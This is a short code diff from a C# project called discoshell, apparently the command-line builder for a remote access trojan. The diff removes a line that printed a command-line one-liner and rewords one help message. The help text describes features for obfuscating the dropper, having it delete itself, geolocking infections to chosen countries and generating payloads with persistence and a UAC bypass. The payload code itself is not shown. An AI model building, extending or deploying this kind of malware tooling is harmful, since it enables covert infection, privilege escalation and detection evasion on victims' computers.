@@ -46,7 +46,6 @@ namespace discoshell
             byte[] result = PGen.Generate(_token, _prefix, _obf, _delself, _geolock, _ponly);
             Console.WriteLine($"Writing output to: {_output}");
             File.WriteAllBytes(_output, result);
-            Console.WriteLine($"\nCommand line one-liner: {PGen.GenerateCommand(_token, _prefix, _geolock, _ponly)}\n");
 
             Console.ForegroundColor = ConsoleColor.Green;
             Console.WriteLine("Done.");
@@ -83,7 +82,7 @@ namespace discoshell
             Console.WriteLine("--obfuscate     Obfuscate dropper");
             Console.WriteLine("--deleteself    Make dropper delete itself");
             Console.WriteLine("--geolock       Make RAT only infect machines in specified countries. To specify multiple countries, seperate each country name with a comma.");
-            Console.WriteLine("--payloadonly   Generate RAT payload only without stager (no persistence and no UAC bypass)");
+            Console.WriteLine("--payloadonly   Generate RAT payload only without dropper (no persistence and no UAC bypass)");
             Console.WriteLine();
             Console.ForegroundColor = oldc;
             Environment.Exit(0);
